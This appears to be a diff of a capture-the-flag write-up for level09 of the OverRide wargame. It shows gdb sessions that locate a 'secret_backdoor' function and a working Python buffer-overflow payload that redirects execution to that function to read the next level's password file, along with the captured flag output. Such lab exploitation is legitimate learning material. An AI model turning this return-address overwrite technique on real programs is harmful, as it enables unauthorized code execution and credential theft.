@@ -159,8 +159,79 @@ Program received signal SIGSEGV, Segmentation fault.
 rip            0x4242424242424242       0x4242424242424242
 (gdb) 
 ------ testing the backdoor ------
+level09@OverRide:~$ gdb -q ./level09
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) info functions secret_backdoor
+All functions matching regular expression "secret_backdoor":
 
-while true; do python -c 'print "A"*40 + "\xd2" + "\n" + "B"*200 + "\x8c\x08" + "\n" + "cat /home/us
-ers/end/.pass"' | ./level09 | grep -v "Welcome"; done
+Non-debugging symbols:
+0x000000000000088c  secret_backdoor
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
+(gdb) 
 
-OR "B"*208
+
+level09@OverRide:~$ gdb -q ./level09
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) info functions secret_backdoor
+All functions matching regular expression "secret_backdoor":
+
+Non-debugging symbols:
+0x000000000000088c  secret_backdoor
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
+(gdb) break main
+Breakpoint 1 at 0xaac
+(gdb) run
+Starting program: /home/users/level09/level09 
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) info proc mappings
+process 4956
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      0x555555554000     0x555555555000     0x1000        0x0 /home/users/level09/level09
+      0x555555755000     0x555555756000     0x1000     0x1000 /home/users/level09/level09
+      0x555555756000     0x555555757000     0x1000     0x2000 /home/users/level09/level09
+      0x7ffff7a1c000     0x7ffff7bd0000   0x1b4000        0x0 /lib/x86_64-linux-gnu/libc-2.15.so
+      0x7ffff7bd0000     0x7ffff7dcf000   0x1ff000   0x1b4000 /lib/x86_64-linux-gnu/libc-2.15.so
+      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x1b3000 /lib/x86_64-linux-gnu/libc-2.15.so
+      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x1b7000 /lib/x86_64-linux-gnu/libc-2.15.so
+      0x7ffff7dd5000     0x7ffff7dda000     0x5000        0x0 
+      0x7ffff7dda000     0x7ffff7dfc000    0x22000        0x0 /lib/x86_64-linux-gnu/ld-2.15.so
+---Type <return> to continue, or q <return> to quit---return
+      0x7ffff7fef000     0x7ffff7ff2000     0x3000        0x0 
+      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x22000 /lib/x86_64-linux-gnu/ld-2.15.so
+      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x23000 /lib/x86_64-linux-gnu/ld-2.15.so
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+(gdb) p &main
+$2 = (<text variable, no debug info> *) 0x555555554aa8 <main>
+(gdb) p secret_backdoor
+$3 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+-----------------------
+
+python -c "
+import struct, sys
+
+backdoor = 0x55555555488c
+
+username = 'A'*40 + '\xff'
+msg = 'B'*200 + struct.pack('<Q', backdoor)
+cmd = 'cat /home/users/end/.pass\n'
+
+sys.stdout.write(username + '\n' + msg + '\n' + cmd)
+" | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
+level09@OverRide:~$ 
